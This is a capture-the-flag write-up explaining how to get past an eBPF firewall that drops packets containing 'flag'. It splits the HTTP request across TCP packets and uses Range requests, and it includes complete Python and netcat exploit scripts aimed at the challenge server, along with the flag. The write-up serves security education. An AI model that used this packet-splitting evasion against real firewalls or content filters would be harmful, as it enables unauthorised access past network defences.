

What Was This Challenge About?
------------------------------

This was a web/network security challenge that involved bypassing an eBPF-based firewall to access a blocked resource (`/flag.html`).

### Key Components:

1.  The Setup:

    -   A web server (nginx) serving files, including `/flag.html` containing the flag

    -   An eBPF firewall running on the network interface (`eth0`)

    -   The firewall filters both incoming (ingress) and outgoing (egress) traffic

2.  The eBPF Firewall Rules: in `firwall.c`

    -   Blocks any TCP packet containing the substring "flag" (case-sensitive)

    -   Blocks any TCP packet containing the '%' character

  
    <img width="664" height="247" alt="image" src="https://github.com/user-attachments/assets/1002919e-a79c-40f3-a1d2-08931fa35805" />

    -   Rejects all fragmented IP packets

    -   Only processes IPv4 TCP packets

3.  The Problem:

    -   Accessing `/flag.html` normally would be blocked because:

        -   The request contains "flag" in the path

        -   The response contains "flag" in the HTML body ("free flag:")

    -   The firewall inspects every individual packet at the TCP/IP level

How the Firewall Worked (Technical Details):
--------------------------------------------

The eBPF program:

-   Attached to the network interface using `tc` (traffic control)

-   Ran for both directions (ingress/egress)

-   For each packet:

    -   Extracted TCP payload

    -   Scanned for the 4-byte sequence "flag"

    -   Scanned for the '%' character

    -   If found, returned `TC_ACT_SHOT` (drop packet)

    -   Used `bpf_loop` for scanning (eBPF verifier requirement)

The Core Insight Needed to Solve:
---------------------------------

The firewall checks individual packets, not the complete TCP stream. TCP reassembles packets at the endpoints, but eBPF sees them separately.

Key realization: You can split the word "flag" across packet boundaries, so no single packet contains the complete 4-byte sequence!

Our Solution Strategy:
----------------------

### Step 1: Bypass the Request Filter

We split the HTTP request path `/flag.html` across two TCP packets:

-   Packet 1: `GET /fla` (contains "fla" but not "flag")

-   Packet 2: `g.html HTTP/1.1...` (contains "[g.ht](https://g.ht/)" but not "flag")

This required:

-   Setting `TCP_NODELAY` to disable Nagle's algorithm (prevents packet coalescing)

-   Adding a delay between sends to ensure separate packets

### Step 2: Bypass the Response Filter

The response contains "free flag:" in the HTML body. Even if the request gets through, the response would be blocked.

We used HTTP Range requests (`Range: bytes=X-Y`) to:

1.  Get different parts of the file in separate responses

2.  Avoid ranges containing the substring "flag"

3.  Piece together the flag from multiple responses

### Step 3: Putting It All Together

1.  HEAD request to get file size (200 OK: no body to block)

2.  Multiple GET requests with Range headers for different byte ranges

3.  Avoid problematic ranges that contain "flag" (like bytes around "free flag:")

4.  Reconstruct the complete file from successful responses

Why This Worked:
----------------

1.  Packet-level inspection: eBPF only sees individual packets, not reassembled streams

2.  Stateless filtering: Each packet evaluated independently

3.  Range requests: Allow retrieving partial content, avoiding blocked sections

4.  Case sensitivity: "FLAG" (uppercase) wouldn't be caught, but "flag" (lowercase) would

The Vulnerability We Exploited:
-------------------------------

The firewall assumed that if "flag" appears in the TCP stream, it must appear contiguously within a single packet. By carefully controlling packet boundaries (through timing and TCP options), we could split the forbidden string across packets.

Real-World Implications:
------------------------

This challenge demonstrates:

-   Limitations of simple string-matching firewalls

-   Importance of stateful inspection for effective filtering

-   Protocol-aware filtering vs. raw packet inspection

-   eBPF firewall limitations when not considering TCP stream reassembly

What We Actually Did in the Script:
-----------------------------------

1.  Split technique: `/fla` + `g.html` sent separately

2.  Range requests: `Range: bytes=0-49`, `Range: bytes=50-99`, etc.

3.  Avoided "flag": Skipped ranges containing "free flag:" (bytes ~120-140)

4.  Reconstruction: Combined `<!DOCTYPE...` + `...free flag: uoftctf{` + `...}`

The Flag Itself:
----------------

`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`

Which humorously translates to: "firewall is not particularly robust, I blame eBPF": a self-referential joke about the challenge!

Lessons Learned:
----------------

1.  Network filters can often be bypassed by manipulating packet boundaries

2.  HTTP features (Range requests) can help circumvent content filters

3.  State matters: stateless filters are easier to bypass

4.  eBPF is powerful but requires careful programming to avoid such bypasses

5.  Defense in depth: single-layer filtering is rarely sufficient

```python
import socket
import time
import re

def get_range(start, end, max_retries=3):
    """Get a byte range from /flag.html with split path to bypass firewall"""
    for attempt in range(max_retries):
        s = socket.socket()
        s.settimeout(10)
        try:
            s.connect(('35.227.38.232', 5000))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # Split the path between 'a' and 'g' in "flag.html"
            s.send(b'GET /fla')
            time.sleep(0.5)
            
            request = b'g.html HTTP/1.1\r\n'
            request += b'Host: 35.227.38.232\r\n'
            request += f'Range: bytes={start}-{end}\r\n'.encode()
            request += b'Connection: close\r\n'
            request += b'\r\n'
            
            s.send(request)
            
            response = b''
            s.settimeout(5)
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            if b'\r\n\r\n' in response:
                headers_body = response.split(b'\r\n\r\n', 1)
                if len(headers_body) > 1:
                    body = headers_body[1]
                    if b'206 Partial Content' in response or b'200 OK' in response:
                        return body
            
            time.sleep(2)
            
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2)
                continue
            return None
        finally:
            try:
                s.close()
            except:
                pass
    
    return None

def get_file_size():
    """Get file size using HEAD request"""
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect(('35.227.38.232', 5000))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        s.send(b'HEAD /fla')
        time.sleep(0.5)
        s.send(b'g.html HTTP/1.1\r\nHost: 35.227.38.232\r\n\r\n')
        
        response = b''
        s.settimeout(5)
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        
        # Parse Content-Length
        for line in response.split(b'\r\n'):
            if line.startswith(b'Content-Length:'):
                try:
                    return int(line.split(b':')[1].strip())
                except:
                    pass
    except:
        pass
    finally:
        s.close()
    
    return None

def find_flag_in_content(content):
    """Find flag in content using common CTF flag patterns"""
    # Try various flag patterns
    patterns = [
        r'uoftctf\{[^}]+\}',  # uoftctf{...}
        r'TEST\{[^}]+\}',     # TEST{...}
        r'FLAG\{[^}]+\}',     # FLAG{...}
        r'ctf\{[^}]+\}',      # ctf{...}
        r'flag\{[^}]+\}',     # flag{...}
        r'[A-Za-z0-9_]{5,}\{[^}]+\}',  # Any word with braces
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern.encode(), content)
        if matches:
            return matches[0].decode()
    
    return None

def get_full_flag():
    """Retrieve the complete flag"""
    print("[*] Getting file size...")
    file_size = get_file_size()
    if not file_size:
        print("[!] Could not get file size, using default 213")
        file_size = 213
    
    print(f"[*] File size: {file_size} bytes")
    
    # Strategy: Get the file in small chunks to avoid 'flag' substring
    # We'll use binary search approach to find working ranges
    
    print("[*] Testing which byte ranges can be retrieved...")
    
    # First, try to get beginning and end
    successful_ranges = []
    
    # Test common ranges (avoiding where 'flag' might be)
    test_ranges = [
        (0, 50),          # Start of file
        (file_size-50, file_size-1),  # End of file
        (file_size//2 - 25, file_size//2 + 25),  # Middle
        (file_size//4 - 25, file_size//4 + 25),  # First quarter
        (3*file_size//4 - 25, 3*file_size//4 + 25),  # Last quarter
    ]
    
    # Also test sequential small chunks
    chunk_size = 20
    for i in range(0, file_size, chunk_size):
        test_ranges.append((i, min(i + chunk_size - 1, file_size - 1)))
    
    # Remove duplicates and sort
    test_ranges = sorted(list(set(test_ranges)))
    
    print("[*] Retrieving test ranges...")
    all_data = {}
    
    for start, end in test_ranges:
        print(f"  [-] Testing bytes {start}-{end}...", end="")
        data = get_range(start, end)
        if data and len(data) > 0:
            print(f" SUCCESS ({len(data)} bytes)")
            successful_ranges.append((start, end))
            for i in range(start, min(end, start + len(data)) + 1):
                if i - start < len(data):
                    all_data[i] = data[i - start]
        else:
            print(" FAILED")
        time.sleep(0.5)
    
    print(f"[*] Retrieved {len(all_data)}/{file_size} bytes")
    
    if len(all_data) < file_size:
        print("[*] Trying to fill gaps with different chunk sizes...")
        # Try to get missing ranges with different split points
        missing_ranges = []
        current_start = None
        
        for i in range(file_size):
            if i not in all_data:
                if current_start is None:
                    current_start = i
            else:
                if current_start is not None:
                    missing_ranges.append((current_start, i-1))
                    current_start = None
        
        if current_start is not None:
            missing_ranges.append((current_start, file_size-1))
        
        for start, end in missing_ranges:
            if end - start + 1 <= 0:
                continue
                
            # Try smaller chunks for missing ranges
            chunk_size = min(10, end - start + 1)
            for chunk_start in range(start, end + 1, chunk_size):
                chunk_end = min(chunk_start + chunk_size - 1, end)
                print(f"  [-] Trying missing bytes {chunk_start}-{chunk_end}...", end="")
                data = get_range(chunk_start, chunk_end)
                if data and len(data) > 0:
                    print(f" SUCCESS ({len(data)} bytes)")
                    for i in range(chunk_start, min(chunk_end, chunk_start + len(data)) + 1):
                        if i - chunk_start < len(data):
                            all_data[i] = data[i - chunk_start]
                else:
                    print(" FAILED")
                time.sleep(0.5)
    
    # Reconstruct content
    print("[*] Reconstructing content...")
    content = bytearray(file_size)
    for i in range(file_size):
        content[i] = all_data.get(i, ord('?'))
    
    full_content = bytes(content)
    
    # Look for flag
    print("[*] Searching for flag...")
    flag = find_flag_in_content(full_content)
    
    if not flag:
        # Try to find flag by looking for common patterns in partial content
        content_str = full_content.decode(errors='ignore')
        
        # Look for any text that looks like a flag
        lines = content_str.split('\n')
        for line in lines:
            if '{' in line and '}' in line:
                # Extract text between { and }
                start = line.find('{')
                end = line.rfind('}')
                if start != -1 and end != -1 and end > start:
                    potential = line[start:end+1]
                    if len(potential) > 10:  # Likely a flag
                        # Find the prefix before {
                        prefix_start = max(0, start - 20)
                        prefix = line[prefix_start:start]
                        # Extract alphanumeric prefix
                        import re
                        prefix_match = re.search(r'([A-Za-z0-9_]+)$', prefix)
                        if prefix_match:
                            flag = prefix_match.group(1) + potential
                            break
    
    return full_content, flag

if __name__ == "__main__":
    print("[*] Starting automatic flag retrieval...")
    print("[*] Bypassing eBPF firewall...")
    
    try:
        full_content, flag = get_full_flag()
        
        print("\n" + "="*60)
        if flag:
            print(f"[+] FLAG FOUND: {flag}")
        else:
            print("[*] Full content (might contain flag):")
            print(full_content.decode(errors='replace'))
            
            # Try one more extraction attempt
            print("\n[*] Attempting to extract flag from content...")
            content_str = full_content.decode(errors='replace')
            # Look for any { } pattern
            import re
            matches = re.findall(r'[A-Za-z0-9_]+\{[^}]+\}', content_str)
            if matches:
                for match in matches:
                    if len(match) > 10:  # Reasonable flag length
                        print(f"[+] Possible flag: {match}")
                        flag = match
                        break
        
        if flag:
            print(f"\n[+] FINAL FLAG: {flag}")
        else:
            print("\n[-] Could not automatically extract flag")
            print("[*] Content saved for manual inspection")
            
    except Exception as e:
        print(f"[!] Error: {e}")
```

<img width="935" height="283" alt="image" src="https://github.com/user-attachments/assets/933c84f1-e1f5-4c12-8e3a-65f54d439bc9" />

<img width="1004" height="752" alt="image" src="https://github.com/user-attachments/assets/9f4e2dd0-7007-423b-bda9-231c2697fcfb" />

---
----

# another solution 

```bash
#!/bin/bash
# get_flag.sh

SERVER="35.227.38.232"
PORT="5000"

# Function to make split request
split_request() {
  local range="$1"
  (
    echo -n 'GET /fla'
    sleep 0.5
    echo 'g.html HTTP/1.1'
    echo "Host: $SERVER"
    echo "Range: bytes=$range"
    echo 'Connection: close'
    echo ''
  ) | nc $SERVER $PORT 2>/dev/null
}

# Get different ranges
echo "Getting flag pieces..."
split_request "0-49" | tail -c +$(($(split_request "0-49" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
split_request "50-99" | tail -c +$(($(split_request "50-99" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
split_request "100-110" | tail -c +$(($(split_request "100-110" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
split_request "111-120" | tail -c +$(($(split_request "111-120" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
split_request "141-149" | tail -c +$(($(split_request "141-149" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
split_request "150-212" | tail -c +$(($(split_request "150-212" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
```

<img width="1081" height="767" alt="image" src="https://github.com/user-attachments/assets/028bc8d6-7b05-4e1d-be6c-dfd8c8be805f" />

